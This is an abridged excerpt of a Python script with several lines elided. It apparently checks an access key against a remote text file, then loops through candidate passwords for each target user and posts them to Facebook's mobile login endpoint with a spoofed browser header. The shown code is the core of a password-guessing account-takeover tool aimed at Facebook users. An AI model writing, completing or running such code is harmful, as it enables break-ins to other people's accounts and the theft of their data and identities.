...
def main_apv():
    ...
    r1=requests.get("https://raw.githubusercontent.com/FerdousAkhtan/dummi/main/Approval.txt").text
    if key1 in r1:
        hamii()
    else:
        os.system("clear")
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        try:
            for pw in __chi__:
                ...
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T837V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5497.211 Mobile Safari/537.36',}
                po = session.post(f"https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", data = das, headers = header1, allow_redirects = False)
